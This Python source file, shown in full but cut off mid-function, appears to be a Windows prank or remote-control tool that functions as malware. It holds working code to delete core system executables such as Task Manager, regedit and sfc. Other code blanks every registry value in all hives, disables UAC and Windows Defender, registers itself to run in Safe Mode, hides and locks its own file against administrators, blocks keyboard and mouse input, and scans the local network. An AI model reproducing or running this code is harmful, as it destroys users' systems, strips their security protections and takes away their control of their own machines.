import time
import ctypes
import sys
import os
import subprocess
import pyautogui
import pyotp.totp
import requests
import asyncio
import socket
import numpy as np
from PIL import Image, ImageDraw, ImageTk
import io
import queue
import cv2
import traceback
import select
import av
import soundfile as sf
import zlib 
import uuid
import tempfile
import zipfile
from PyQt5.QtMultimedia import QSoundEffect
from converter import mp4_to_wav_converter  # Import the converter function

import colorsys

from PyQt5.QtCore import (
    Qt, QTimer, QPointF, QRect, QUrl, QPoint as QP, QObject, QThread, pyqtSignal, pyqtSlot
)
import mutagen
from mutagen import File as MutagenFile  # optional rename

from PyQt5.QtGui import (
    QPainter, QColor, QFont, QPainterPath,
    QLinearGradient, QRadialGradient, QPen, QBrush, QTransform
)
from PyQt5.QtWidgets import (
    QApplication, QWidget, QPushButton, QHBoxLayout, QVBoxLayout
)
from pydub import AudioSegment
import threading
from threading import Event
import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
from selenium import webdriver
import random
import screen_brightness_control as sbc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import selenium.common.exceptions
import math
from bs4 import BeautifulSoup
import re
import win32com
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
import xml.etree.ElementTree as ET
import keyboard
import string
import wget
from pyshortcuts import make_shortcut
import winreg
from PIL import Image, ImageChops
import urllib.request
import win32gui
from mark1_translate import translate as translator
from pynput import keyboard as pynput_keyboard
import win32process
import imutils
import json
import concurrent.futures
import base64
from concurrent.futures import ThreadPoolExecutor
import urllib
try:
    import scapy.all
except Exception as e:
    print(f'Error: {e}')

import pyttsx3
import winsound
import pynput
import wave
import pyaudio
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import multiprocessing
import signal
import pygame
import pyotp
# from multiprocessing import current_process # method doesn't work, use own implement method called, multiprocessing_child_node, if it's True it means that its running from parent and current is a child. 
import shlex
import pyautogui as pt
import sounddevice as sd
import comtypes
from Crypto.Cipher import AES
from Crypto.Util import number
import win32api
from win32gui import GetDC, BitBlt, DeleteDC, StretchBlt, LoadIcon, DrawIcon
from win32api import GetSystemMetrics

from win32con import NOTSRCCOPY, SRCCOPY, IDI_WARNING, IDI_ERROR, SM_SWAPBUTTON
import re
import psutil
from tcp_latency import measure_latency
import rotatescreen
import ast
from pynput.keyboard import Key, Listener
import win32con
import logging
from datetime import datetime
from gtts import gTTS
import playsound
from pytube import YouTube
import pythoncom, pyWinhook
import win32comext.shell.shell as shell
from langdetect import detect, DetectorFactory
import trace
from random import randint
from PyQt5.QtWidgets import QApplication, QLabel, QVBoxLayout, QWidget, QPushButton, QSizePolicy, QCheckBox
from PyQt5.QtGui import QPixmap, QImage
from PyQt5.QtCore import QThread, pyqtSignal, Qt
import PyQt5.QtCore as QtCore
from PyQt5.QtGui import QKeySequence
import struct
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import gevent
from random import choice as choice_list
# from flask import Flask, render_template
# from flask_socketio import SocketIO
import requests
import geocoder
from geopy.geocoders import Nominatim
from geopy.geocoders import Photon
from engineio.async_drivers import gevent
# from flask import Flask, jsonify, render_template
# from flask import Flask, render_template, request, Response
# from PIL import Image
# from flask import url_for
# from flask import session, redirect
# from flask import Flask, request, jsonify
from flask import Flask, session, request, redirect, url_for, render_template
from flask_socketio import SocketIO, disconnect
from functools import wraps
# from gevent import Event
import secrets
from flask import Flask, session, request, redirect, url_for, render_template
from flask_socketio import SocketIO, disconnect, emit
from functools import wraps
from queue import Queue
from flask import jsonify
from werkzeug.utils import secure_filename

from longvariables import system32_files, windows_files
from datetime import datetime, timedelta
# print(f'Main == __name__ true? {__name__ == "__main__"}')

# --- Global Variables ---
startup_START = time.time()
admin_privileges = not (ctypes.windll.shell32.IsUserAnAdmin() == 0)
mouse_idle = 0  
keyboard_idle = 0  
script_start = time.time()
pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0
socket.setdefaulttimeout(None)
autoterminateunknownexeprocesses = False
autofreezeunknownprocesses = False 
SelfUserUsername = os.environ['username']
SelfComputerName = os.environ['COMPUTERNAME'] 
prioritizeipv4 = None
INTERNET = False  
last_successful_check = 0
CHECK_INTERVAL = 1  
TIMEOUT_THRESHOLD = 5 
HEADER = 64
vary_PORT = 45102 
server = None
done_vary_tasks = []
computersusername = os.environ['username']
varyhosts = []  
timeout_device_list = {}  
connected_devices = [] 
device_search = []  
device_item_received = {} 
STARTUP_FOLDER = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
screen_width = win32api.GetSystemMetrics(0)
screen_height = win32api.GetSystemMetrics(1)
mouse_listener = pynput.mouse.Listener(suppress=True)
passcode = 'Enter passcode here'
passcode_rel = base64.b32encode(bytearray(passcode, 'ascii')).decode('utf-8')
passcode_ver = pyotp.TOTP(passcode_rel)
hm = None
# disablekeyboard_threadtorun_thread = KThread(target=disablekeyboard_threadtorun) # Moved to a different place due to function and class not being defined
running_ss = False
COMMAND_DELIMITER = ";;" 
SmartAssNoInternet_isenabled = True
killablethread_thread = None
timeoutfordvd = 0
last_keyboard_input_time = time.time()
last_mouse_input_time = time.time()
# dvd_runthread = KThread(target=startdvdanim) # Moved to a different place due to function and class not being defined
stop_event_windowslag = threading.Event()
stop_event_windowslag.set()


# Check if this is a multiprocessing child node
# multiprocessing_child_node = False
# if len(sys.argv) > 1 and '--multiprocessing-fork' in sys.argv:
#     multiprocessing_child_node = True
    
# print(f'Multiprocessing child node: {multiprocessing_child_node}')
print(f'Argv: {sys.argv}')

if __name__ == '__main__':
    multiprocessing.freeze_support()

# --- Utility Functions ---

def slp(seconds):
    """Sleeps without using time.sleep(), preventing thread blocking.

    Args:
        seconds (int): The number of seconds to wait.
    """
    
    toWait = time.time() + seconds
    while time.time() < toWait:
        pass


def runfunctionvianame(name, *args, **kwargs):
    """Runs a function by its name from the current module.

    Args:
        name (str): The name of the function to run.
        *args: Variable length argument list for the function.
        **kwargs: Arbitrary keyword arguments for the function.

    Returns:
        None
    """
    try:
        func = getattr(sys.modules[__name__], name)
        if func:
            func(*args, **kwargs)
        else:
            print(f"No function named {name} found.")
    except Exception as e:
        print(f"Error running function {name}: {e}")

def installchrome():
    """Downloads and installs the latest version of Google Chrome."""
    url = "https://dl.google.com/chrome/install/latest/chrome_installer.exe"
    filename = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) + '.exe'
    download_dir = os.path.join(os.path.expanduser("~"), "Downloads")
    filename_dir = os.path.join(download_dir, filename)

    with requests.get(url, stream=True) as response:
        response.raise_for_status()
        with open(filename_dir, "wb") as f:
            for chunk in response.iter_content(chunk_size=1024):
                f.write(chunk)
    
    slp(2)
    run_command_as_admin(filename_dir + ' /install')

def download_and_run_desktop_goose():
    """Downloads, unzips, and runs Desktop Goose."""
    url = "static dl link didn't work, dropbox perhaps? nan, don't - cannot upload such a thing to github"
    zip_filename = "Desktop Goose v0.31.zip"
    download_dir = os.path.join(os.path.expanduser("~"), "Downloads")
    zip_path = os.path.join(download_dir, zip_filename)
    
    # Bad downloading as of now, need to fix it
    # I also need to find a fixed download url.
    
    
    # Download the file
    print("Downloading Desktop Goose...")
    response = requests.get(url)
    with open(zip_path, 'wb') as file:
        file.write(response.content)
    
    # Unzip the file
    print("Unzipping the file...")
    extract_dir = os.path.join(download_dir, "Desktop Goose v0.31")
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extract_dir)
    
    # Construct path to the executable
    goose_path = os.path.join(extract_dir, "Desktop Goose v0.31", "DesktopGoose v0.31", "GooseDesktop.exe")
    
    # Run the executable
    print("Running Desktop Goose...")
    subprocess.Popen(goose_path)


def kill_desktop_goose():
    """Terminates the Desktop Goose process."""
    print("Attempting to terminate Desktop Goose...")
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == 'GooseDesktop.exe':
            proc.terminate()
            print("Desktop Goose terminated.")
            return
    print("Desktop Goose process not found.")

def cleanup_desktop_goose():
    """Removes the downloaded and extracted Desktop Goose files."""
    download_dir = os.path.join(os.path.expanduser("~"), "Downloads")
    zip_path = os.path.join(download_dir, "Desktop Goose v0.31.zip")
    extract_dir = os.path.join(download_dir, "Desktop Goose v0.31")
    
    print("Cleaning up Desktop Goose files...")
    
    # Remove zip file
    if os.path.exists(zip_path):
        os.remove(zip_path)
        print("Zip file removed.")
    
    # Remove extracted directory
    if os.path.exists(extract_dir):
        os.remove(extract_dir)
        print("Extracted files removed.")
    
    print("Cleanup completed.")

def disablekeyboard_threadtorun():
    """Disables keyboard input by setting a low-level keyboard hook."""
    global hm
    hm = pyWinhook.HookManager()
    hm.KeyAll = lambda event: False
    hm.HookKeyboard()
    pythoncom.PumpMessages()

def disable_keyboard():
    """Starts a thread to disable keyboard input."""
    global disablekeyboard_threadtorun_thread
    if not disablekeyboard_threadtorun_thread.is_alive():
        disablekeyboard_threadtorun_thread.start()

def enable_keyboard():
    """Stops the thread that disables keyboard input."""
    global hm, disablekeyboard_threadtorun_thread
    if disablekeyboard_threadtorun_thread.is_alive():
        disablekeyboard_threadtorun_thread.kill()
        hm.UnhookKeyboard()
        disablekeyboard_threadtorun_thread = KThread(target=disablekeyboard_threadtorun)

def disable_mouse():
    """Starts the mouse listener to disable mouse input."""
    global mouse_listener
    if not mouse_listener.is_alive():
        mouse_listener.start()

def enable_mouse():
    """Stops the mouse listener and creates a new one."""
    global mouse_listener
    if mouse_listener.is_alive():
        mouse_listener.stop()
        mouse_listener = pynput.mouse.Listener(suppress=True)

def presskeys(inputGiven):
    """Presses and releases the specified keys.

    Args:
        inputGiven (str): The keys to press, e.g., "ctrl+c".
    """
    try:
        
        pyautogui.hotkey(inputGiven.split('+'))
    except Exception as e:
        print(f'Error pressing keys: {e}')

def writetext(text):
    """Types the specified text using the keyboard.

    Args:
        text (str): The text to type.
    """
    keyboard.write(text)

def MeAndTheBoys():
    """Plays a random YouTube video from a predefined list."""
    videos = [
        'https://www.youtube.com/watch?v=DMBU88iR-wg', 
        'https://www.youtube.com/watch?v=W-Repa-xAxA', 
        'https://www.youtube.com/watch?v=_zaQgzOREHA', 
        'https://www.youtube.com/watch?v=6G4OlCbTpec'
    ]
    random_video = random.choice(videos)
    webhandler(random_video)

def corrupt_taskscheduler():
    """Corrupts the Windows Task Scheduler by deleting essential files."""
    run_command_as_admin('takeown /f C:\\Windows\\System32\\taskschd.dll')
    run_command_as_admin('icacls "C:\\Windows\\System32\\taskschd.dll" /grant *S-1-5-32-544:F')
    run_command_as_admin('taskkill /f /im taskschd.dll')
    slp(0.5)
    run_command_as_admin('del "C:\\Windows\\System32\\taskschd.dll"')
    
    run_command_as_admin('takeown /f C:\\Windows\\System32\\taskschd.msc')
    run_command_as_admin('icacls "C:\\Windows\\System32\\taskschd.msc" /grant *S-1-5-32-544:F')
    run_command_as_admin('taskkill /f /im taskschd.msc')
    slp(0.5)
    run_command_as_admin('del "C:\\Windows\\System32\\taskschd.msc"')
    
    run_command_as_admin('takeown /f C:\\Windows\\System32\\TaskSchdPS.dll')
    run_command_as_admin('icacls "C:\\Windows\\System32\\TaskSchdPS.dll" /grant *S-1-5-32-544:F')
    run_command_as_admin('taskkill /f /im TaskSchdPS.dll')
    slp(0.5)
    run_command_as_admin('del "C:\\Windows\\System32\\TaskSchdPS.dll"')

    run_command_as_admin('takeown /f C:\\Windows\\System32\\schtasks.exe')
    run_command_as_admin('icacls "C:\\Windows\\System32\\schtasks.exe" /grant *S-1-5-32-544:F')
    run_command_as_admin('taskkill /f /im schtasks.exe')
    slp(0.5)
    # run_command_as_admin('del "C:\\Windows\\System32\\schtasks.exe"') # deleting this results in the inability to add new tasks to the task scheduler

def corrupttaskmgr():
    """Corrupts the Windows Task Manager by deleting the executable."""
    run_command_as_admin('takeown /f taskmgr.exe')
    run_command_as_admin('icacls "C:\\Windows\\system32\\taskmgr.exe" /grant *S-1-5-32-544:F')
    run_command_as_admin('taskkill /f /im taskmgr.exe')
    slp(0.5)
    run_command_as_admin('del "C:\\Windows\\system32\\taskmgr.exe"')

def corruptmmc():
    """Corrupts the Windows Management Console by deleting the executable."""
    run_command_as_admin('takeown /f "C:\\Windows\\system32\\mmc.exe"')
    run_command_as_admin('icacls "C:\\Windows\\system32\\mmc.exe" /grant *S-1-5-32-544:F')
    run_command_as_admin('taskkill /f /im mmc.exe')
    slp(0.5)
    run_command_as_admin('del "C:\\Windows\\system32\\mmc.exe"')

def corruptregedit():
    """Corrupts the Windows Registry Editor by deleting the executable."""
    run_command_as_admin('takeown /f "C:\\Windows\\regedit.exe"')
    run_command_as_admin('icacls "C:\\Windows\\regedit.exe" /grant *S-1-5-32-544:F')
    run_command_as_admin('taskkill /f /im regedit.exe')
    slp(0.5)
    run_command_as_admin('del "C:\\Windows\\regedit.exe"')

def corruptdllhost():
    """Corrupts the Windows DLL Host by deleting the executable."""
    run_command_as_admin('takeown /f "C:\\Windows\\dllhost.exe"')
    run_command_as_admin('icacls "C:\\Windows\\dllhost.exe" /grant *S-1-5-32-544:F')
    run_command_as_admin('taskkill /f /im dllhost.exe')
    slp(0.5)
    run_command_as_admin('del "C:\\Windows\\dllhost.exe"')

def corruptsfc():
    """Corrupts the Windows System File Checker by deleting the executable."""
    run_command_as_admin('takeown /f "C:\\Windows\\System32\\sfc.exe"')
    run_command_as_admin('icacls "C:\\Windows\\System32\\sfc.exe" /grant *S-1-5-32-544:F')
    run_command_as_admin('taskkill /f /im sfc.exe')
    slp(0.5)
    run_command_as_admin('del "C:\\Windows\\System32\\sfc.exe"')

def corruptsystemreset():
    """Corrupts the Windows System Reset by deleting the executable."""
    run_command_as_admin('takeown /f "C:\\Windows\\System32\\systemreset.exe"')
    run_command_as_admin('icacls "C:\\Windows\\System32\\systemreset.exe" /grant *S-1-5-32-544:F')
    run_command_as_admin('taskkill /f /im systemreset.exe')
    slp(0.5)
    run_command_as_admin('del "C:\\Windows\\System32\\systemreset.exe"')


def runcmd(cmd, suppress=False, retry=0):
    """Runs a command in the shell.

    Args:
        cmd (str): The command to run.
        suppress (bool): Whether to suppress output. Defaults to False.
        retry (int): Number of retries. Defaults to 0.

    Returns:
        None
    """
    try:
        a = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        a.wait()
        if a.returncode == 0:
            if not suppress:
                print("The command ran successfully", "@ command :", cmd)
        else:
            if not suppress:
                print("The command failed with return code", a.returncode, "@ command :", cmd)
            if retry > 4:
                return
            retry += 1
            runcmd(cmd, suppress, retry)
    except Exception as e:
        print(f'Error at runcmd, {e}')

def run_command_as_admin(cmd, suppress=False, retry=0):
    """Runs a command with administrator privileges.

    Args:
        cmd (str): The command to run.
        suppress (bool): Whether to suppress output. Defaults to False.
        retry (int): Number of retries. Defaults to 0.

    Returns:
        None
    """
    try:
        a = shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+cmd)
        if a['hInstApp'] > 32:
            if not suppress:
                print("The admin command ran successfully", "@ command :", cmd)
        else:
            if not suppress:
                print("The admin command failed with an error code", ctypes.WinError(), "@ command :", cmd)
            if retry > 4:
                return
            retry += 1
            return run_command_as_admin(cmd, suppress, retry)
    except Exception as e:
        print(f'Error at run_command_as_admin, {e}, CMD:{cmd}')
        if 'The operation was canceled by the user.' in e.args:
            retry +=1
            return run_command_as_admin(cmd, suppress, retry)

def screenoff():
    """Turns off the screen."""
    win32api.SendMessage(0xFFFF, 0x0112, 0xF170, 2) 

def blackenscreen(durationinSeconds):
    """Turns the screen black for a specified duration.

    Args:
        durationinSeconds (int): The duration in seconds.
    """
    try:
        t_end = time.time() + int(durationinSeconds)
        while time.time() < t_end:
            threading.Thread(target=screenoff).start()
            slp(0.2)
    except Exception as e:
        print(f'Error in blackenscreen, {e}')

def texttospeech(text):
    """Speaks the given text using text-to-speech."""
    pythoncom.CoInitialize()
    pyttsx3.init(driverName='sapi5')
    engine = pyttsx3.init()
    engine.setProperty('rate', 165)
    engine.setProperty('volume', 10)
    engine.say(f'<pitch middle="-15">{text}</pitch>')
    engine.runAndWait()
    pythoncom.CoInitialize()

def transalte(translatetext, toLang):
    """Translates the given text to the specified language.

    Args:
        translatetext (str): The text to translate.
        toLang (str): The target language code (e.g., 'ru', 'fr').

    Returns:
        str: The translated text.
    """
    translator_obj = translator(translatetext, dest=toLang, src='auto')
    translated_text = translator_obj.text
    return translated_text

def speak(text, lang):
    """Speaks the given text in the specified language using gTTS.

    Args:
        text (str): The text to speak.
        lang (str): The language code (e.g., 'en', 'ru').
    """
    try:
        filename = f"tmp{randint(0, 1024123)}files.mp3"
        filepath = get_script_directory() + '\\' + filename
        tts = gTTS(text=text, lang=lang)
        tts.save(filepath)
        pygame.mixer.init()
        pygame.mixer.music.load(filepath)
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy():
            pygame.time.Clock().tick(10)
        pygame.mixer.music.unload()
        os.remove(filepath)
    except Exception as e:
        print(f'Caught exception:\n{e}')

def mapLangDetect_gtts(lang):
    lang_mapping = {
        # note languages that are not supported are defaulted to en.
        'af': 'af',
        'ar': 'ar',
        'bg': 'bg',
        'bn': 'bn',
        'ca': 'ca',
        'cs': 'cs',
        'cy': 'en',  
        'da': 'da',
        'de': 'de',
        'el': 'el',
        'en': 'en',
        'es': 'es',
        'et': 'et',
        'fa': 'fa',
        'fi': 'fi',
        'fr': 'fr',
        'gu': 'gu',
        'he': 'iw', 
        'hi': 'hi',
        'hr': 'hr',
        'hu': 'hu',
        'id': 'id',
        'it': 'it',
        'ja': 'ja',
        'kn': 'kn',
        'ko': 'ko',
        'lt': 'lt',
        'lv': 'lv',
        'mk': 'mk',  
        'ml': 'ml',
        'mr': 'mr',
        'ne': 'ne',
        'nl': 'nl',
        'no': 'no',
        'pa': 'en', 
        'pl': 'pl',
        'pt': 'pt',
        'ro': 'ro',
        'ru': 'ru',
        'sk': 'sk',
        'sl': 'en',  
        'so': 'en',  
        'sq': 'sq',
        'sv': 'sv',
        'sw': 'sw',
        'ta': 'ta',
        'te': 'te',
        'th': 'th',
        'tl': 'tl',
        'tr': 'tr',
        'uk': 'uk',
        'ur': 'ur',
        'vi': 'vi',
        'zh-cn': 'zh-CN',
        'zh-tw': 'zh-TW'
    }
    return lang_mapping.get(lang, 'en')

def detectLang(text):
    """Detects the language of the given text.

    Args:
        text (str): The text to analyze.

    Returns:
        str: The language code (e.g., 'en', 'ru').
    """
    try:
        return mapLangDetect_gtts(detect(str(text)))
    except Exception as e:
        print(e)

def speakXlanguage(text):
    """Detects the language of the text and speaks it accordingly."""
    speak(text, detectLang(text))

def disableUserAccountControl():
    """Disables User Account Control (UAC) in Windows."""
    run_command_as_admin('reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f')      

def enableUserAccountControl():
    """Enables User Account Control (UAC) in Windows."""
    run_command_as_admin('reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f')      

        
# function to set each key value to an "empty" equivalent
def nuke_registry(hkey, path=""):
    try:
        with winreg.OpenKey(hkey, path, 0, winreg.KEY_WRITE | winreg.KEY_READ) as key:
            i = 0
            while True:
                try:
                    value_name, value, value_type = winreg.EnumValue(key, i)

                    # set "empty" data based on type
                    if value_type == winreg.REG_SZ:          # string
                        empty_value = ""
                    elif value_type == winreg.REG_DWORD:     # 32-bit integer
                        empty_value = 0
                    elif value_type == winreg.REG_BINARY:    # binary
                        empty_value = b""
                    elif value_type == winreg.REG_MULTI_SZ:  # list of strings
                        empty_value = [""]
                    elif value_type == winreg.REG_QWORD:     # 64-bit integer
                        empty_value = 0
                    else:
                        empty_value = None

                    # if we have an empty value to set, do so
                    if empty_value is not None:
                        winreg.SetValueEx(key, value_name, 0, value_type, empty_value)

                    i += 1
                except OSError:
                    break
    except Exception as e:
        print(f"Error at {path}: {e}")

# function to recursively nuke registry keys in parallel
def recursive_nuke(hkey, path=""):
    try:
        with winreg.OpenKey(hkey, path, 0, winreg.KEY_WRITE | winreg.KEY_READ) as key:
            
            th = threading.Thread(target=nuke_registry, args=(hkey, path))  # start a new thread to nuke the values in the current key
            th.start()  # start the thread

            i = 0
            threads = []  # to keep track of threads
            while True:
                try:
                    subkey = winreg.EnumKey(key, i)
                    subkey_path = f"{path}\\{subkey}" if path else subkey

                    # start a new thread for each subkey
                    thread = threading.Thread(target=recursive_nuke, args=(hkey, subkey_path))
                    threads.append(thread)
                    thread.start()

                    i += 1
                except OSError:
                    break

            # wait for all threads to complete
            for thread in threads:
                thread.join()
    except Exception as e:
        print(f"Error at {path}: {e}")

# main function to nuke registry hives
def nuke_all_hives():
    hives = [
        winreg.HKEY_CLASSES_ROOT,
        winreg.HKEY_CURRENT_USER,
        winreg.HKEY_LOCAL_MACHINE,
        winreg.HKEY_USERS,
        winreg.HKEY_CURRENT_CONFIG
    ]
    
    threads = []
    for hive in hives:
        thread = threading.Thread(target=recursive_nuke, args=(hive,))
        threads.append(thread)
        thread.start()

    # wait for all hive threads to complete
    for thread in threads:
        thread.join()
 
def check_internet():
    global INTERNET, last_successful_check
    sites_to_check = [
        "https://www.google.com",
        "https://www.cloudflare.com",
        "https://www.amazon.com"
    ]
    
    for site in sites_to_check:
        try:
            response = requests.get(site, timeout=2)
            if response.status_code == 200:
                INTERNET = True
                last_successful_check = time.time()
                # print(f'Internet connection detected (connected to {site})')
                return
        except requests.RequestException:
            continue
    
    # If we've reached this point, all checks failed
    if time.time() - last_successful_check > TIMEOUT_THRESHOLD:
        INTERNET = False
        print("Internet connection lost")

def internet_check_loop():
    while True:
        check_internet()
        time.sleep(CHECK_INTERVAL)


def start_internet_check():
    threading.Thread(target=internet_check_loop, daemon=True).start()

if __name__ == '__main__':
    start_internet_check()

class KThread(threading.Thread):
    """A subclass of threading.Thread that can be killed."""
    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Starts the thread."""
        self.__run_backup = self.run
        self.run = self.__run            
        threading.Thread.start(self)

    def __run(self):
        """Installs a trace for killing the thread."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        """Sets the killed flag to True."""
        self.killed = True


disablekeyboard_threadtorun_thread = KThread(target=disablekeyboard_threadtorun) # Needs to be here due to definition errors

def add_to_list_if_not_in(item, lst: list):
    """Adds an item to a list if it's not already present."""
    if item not in lst:
        lst.append(item) 

def search_for_local_devices_port(port: int):
    """Scans the local network for devices listening on the specified port.

    Args:
        port (int): The port to scan.

    Returns:
        list: A list of IP addresses and ports of devices found.
    """
    devices = []

    def scan_ip(ip: str):
        """Scans a single IP address for the specified port."""
        if ip == server:
            return
        socket.setdefaulttimeout(0.7)
        result = socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((ip, port))
        if result == 0:
            devices.append(f'{ip}:{port}')

    def get_subnet() -> str:
        """Gets the subnet mask of the current network."""
        ip_address = SERVER
        if ip_address != '127.0.0.1':
            octets = ip_address.split('.')
            last_octet = int(octets[-1])
            return '.'.join(octets[:3]) + '.', last_octet
        return ''

    subnet, last_octet = get_subnet()
    if not subnet:
        print("Couldn't get the subnet for the given interface")
        return []

    threads = []
    for j in range(1, 255):
        if j == last_octet:
            continue 
        thread = threading.Thread(target=scan_ip, args=[f"{subnet}{j}"])
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print(f"Devices found for port {port} are:", devices)
    return devices

def scan_ports(ip_to_scan):
    """Scans a range of ports on a given IP address.

    Args:
        ip_to_scan (str): The IP address to scan.

    Returns:
        list: A list of open ports.
    """
    devices = []    

    def port(port_name):
        """Scans a single port on the given IP address."""
        socket.setdefaulttimeout(0.7)
        result = socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((ip_to_scan, port_name))
        if result == 0:
            print(f'The port {port_name} is successful for ip {ip_to_scan}')
            devices.append(f'{ip_to_scan}:{port_name}')

    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executorofscanip:
        for i in range(1,255):
            executorofscanip.submit(port, i)
            
    print(devices, f"for {ip_to_scan}")
    return devices

def addToSafeModeLocationFile(Location):
    """Adds the script's location to the Safe Mode registry keys."""
    run_command_as_admin(f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal" /v "robocopy.exe" /t REG_SZ /d "{Location}" /f')
    run_command_as_admin(f'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot" /v "robocopy.exe" /t REG_SZ /d "{Location}" /f')
    run_command_as_admin(f'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network" /v "robocopy.exe" /t REG_SZ /d "{Location}" /f')

def addselftosafemode():
    """Adds the script to run in Safe Mode."""
    addToSafeModeLocationFile(os.path.join(get_script_directory(), get_script_filename()))

def protect_file(file_path):
    """Protects a file by setting permissions and attributes.

    Args:
        file_path (str): The path to the file to protect.
    """
    run_command_as_admin(f'icacls "{file_path}" /inheritance:r /grant:r {os.environ["username"]}:F /deny "*":RX')
    run_command_as_admin(f'icacls "{file_path}" /inheritance:r /grant:r "username":F /deny "administrators":RX')
    run_command_as_admin(f'icacls "{file_path}" /deny {os.getlogin()}:W,D')
    run_command_as_admin(f'attrib +r +h +s "{file_path}"')
    run_command_as_admin(f'attrib +r "{file_path}"')
    run_command_as_admin(f'icacls "{file_path}" /inheritance:r /grant:r "username":F /deny "administrators":RX')
    run_command_as_admin(f'icacls "{file_path}" /disable')

def protectfileself():
    """Protects the script file itself."""
    protect_file(os.path.join(get_script_directory(), get_script_filename()))

def DisableWindowsDefender():
    """Disables various components of Windows Defender."""
    try: 
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" /v DisablePolicyManager /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControlEnabled /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControl /t REG_SZ /d "Anywhere" /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableSpecialRunningModes /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
        run_command_as_admin('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v ForceUpdateFromMU /t REG_DWORD /d 0 /f')
        run_command_as_admin('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f')
    except Exception as e: 
        print(e)
        return False
    
def EnableWindowsDefender():
    """Enables various components of Windows Defender."""
    try: 
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" /v DisablePolicyManager /t REG_DWORD /d 0 /f')
        run_command_as_admin('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControlEnabled /t REG_DWORD /d 1 /f')
